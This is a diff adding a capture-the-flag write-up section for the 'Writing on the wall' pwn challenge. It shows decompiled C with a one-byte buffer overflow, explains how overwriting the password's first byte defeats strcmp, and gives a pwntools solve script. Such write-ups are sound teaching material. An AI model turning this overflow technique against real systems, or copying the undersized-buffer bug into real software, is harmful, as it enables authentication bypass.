@@ -517,6 +517,71 @@ Base64 decode it and you will get the flag
 
 ## Pwn/Writing on the wall
 
+<details>
+<summary>Decompiled Code</summary>
+
+```c
+undefined8 main(void)
+
+{
+  int iVar1;
+  long in_FS_OFFSET;
+  char input [6];
+  undefined8 password;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  password = 0x2073736170743377;
+  read(0,input,7);
+  iVar1 = strcmp(input,(char *)&password);
+  if (iVar1 == 0) {
+    open_door();
+  }
+  else {
+    error("You activated the alarm! Troops are coming your way, RUN!\n");
+  }
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+```
+
+</details>
+
+We can see that it reads 7 bytes into a 6 byte buffer so theres a 1 byte overflow. Luckily, we overflow into the password variable. Our attack strategy is to send 7 null bytes and write 1 null byte into the password variable. Strcmp() compares null terminated strings so if the first byte of the password is already a nullbyte, it will compare 0 to 0 which makes it return 0 and print the flag
+
+<details>
+<summary>Solve Script</summary>
+
+```python
+#!/usr/bin/python
+from pwn import *
+import warnings
+
+warnings.filterwarnings("ignore",category=BytesWarning)
+
+exe = context.binary = ELF('./writing_on_the_wall_patched')
+
+host = "83.136.250.12"
+port = 48086
+
+gdb_script = '''
+
+'''
+
+p = exe.process()
+#p = remote(host,port)
+#p = gdb.debug('./', gdbscript = gdb_script)
+
+p.sendlineafter(">> ", b"\x00"*7)
+
+p.interactive()   
+```
+
+</details>
+
 ## Pwn/Delulu
 
 ## Pwn/Rocket Blaster XXX
